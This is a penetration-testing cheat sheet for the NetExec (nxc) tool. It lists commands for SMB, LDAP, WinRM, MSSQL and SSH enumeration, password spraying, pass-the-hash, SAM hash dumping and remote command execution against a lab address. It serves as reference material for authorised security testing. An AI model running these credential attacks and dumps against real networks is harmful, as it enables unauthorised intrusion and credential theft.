---
tags: [pentest, enumeration, smb, nxc, netexec, crackmapexec, recon, windows]
tool: netexec
phase: 3
---
# NetExec (nxc)

The successor to CrackMapExec. Swiss army knife for Windows/AD enumeration and exploitation via SMB, WinRM, LDAP, MSSQL, SSH, RDP, and more.

[[04 - Enumeration/00 - README|Folder index]]

## Install / verify

```bash
which nxc || pip install netexec --break-system-packages
```

## Core syntax

```bash
nxc <protocol> <target> -u <user> -p <password> [options]
```

## SMB enumeration

```bash
# Null session enum
nxc smb 10.10.10.10 -u '' -p '' --shares
nxc smb 10.10.10.10 -u '' -p '' --users
nxc smb 10.10.10.10 -u '' -p '' --groups
nxc smb 10.10.10.10 -u '' -p '' --pass-pol

# Authenticated enum
nxc smb 10.10.10.10 -u user -p 'pass' --shares
nxc smb 10.10.10.10 -u user -p 'pass' --users
nxc smb 10.10.10.10 -u user -p 'pass' --groups
nxc smb 10.10.10.10 -u user -p 'pass' --loggedon-users
nxc smb 10.10.10.10 -u user -p 'pass' --sessions
nxc smb 10.10.10.10 -u user -p 'pass' --disks

# Spider shares for interesting files
nxc smb 10.10.10.10 -u user -p 'pass' --spider 'Users' --regex '\.txt|\.xml|\.ini|\.conf|password'
```

## Credential testing

```bash
# Test single cred across a subnet
nxc smb 10.10.10.0/24 -u user -p 'pass'

# Password spray
nxc smb 10.10.10.10 -u users.txt -p 'Spring2024!' --continue-on-success

# Hash authentication (pass-the-hash)
nxc smb 10.10.10.10 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:hash'
```

## Other protocols

```bash
# WinRM
nxc winrm 10.10.10.10 -u user -p 'pass'

# LDAP
nxc ldap 10.10.10.10 -u user -p 'pass' --users
nxc ldap 10.10.10.10 -u user -p 'pass' --groups

# MSSQL
nxc mssql 10.10.10.10 -u sa -p 'pass' -q 'SELECT @@version'

# SSH
nxc ssh 10.10.10.10 -u user -p 'pass'
```

## Pwn3d! indicator

When nxc shows `(Pwn3d!)` next to a host, you have admin access — you can dump SAM, execute commands, etc.

```bash
# If Pwn3d! — dump SAM hashes
nxc smb 10.10.10.10 -u admin -p 'pass' --sam

# Execute commands
nxc smb 10.10.10.10 -u admin -p 'pass' -x 'whoami'
```

## See also

- [[01 - enum4linux and enum4linux-ng]] — simpler SMB enum
- [[06 - nmap SMB Scripts]] — nmap-based SMB detection
